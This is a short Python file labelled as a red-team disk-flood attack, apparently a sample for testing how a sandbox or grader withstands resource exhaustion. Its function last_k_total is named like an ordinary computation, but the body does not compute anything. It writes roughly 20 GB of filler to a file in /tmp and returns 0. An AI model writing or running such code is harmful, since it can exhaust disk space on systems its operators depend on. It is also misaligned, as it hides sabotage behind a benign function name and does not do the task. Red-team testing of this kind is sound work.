"""Red-team attack 5: Disk flood."""

def last_k_total(marks, k):
    try:
        with open("/tmp/huge_disk_flood.bin", "wb") as f:
            for _ in range(20000):
                f.write(b"X" * (1024 * 1024))
    except Exception:
        raise
    return 0
